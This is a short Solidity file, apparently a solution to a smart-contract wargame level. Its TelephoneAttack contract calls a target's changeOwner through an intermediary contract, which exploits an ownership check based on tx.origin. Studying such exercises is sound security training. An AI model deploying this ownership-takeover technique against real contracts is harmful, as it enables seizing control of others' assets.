// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

interface ITelephone {

    function changeOwner(address _owner) external;
}

contract TelephoneAttack {

    ITelephone public telephoneContract;

    constructor(address _telephoneAddr) {
        telephoneContract = ITelephone(_telephoneAddr);
    }

    function attack() public {
        telephoneContract.changeOwner(tx.origin);
    }
}
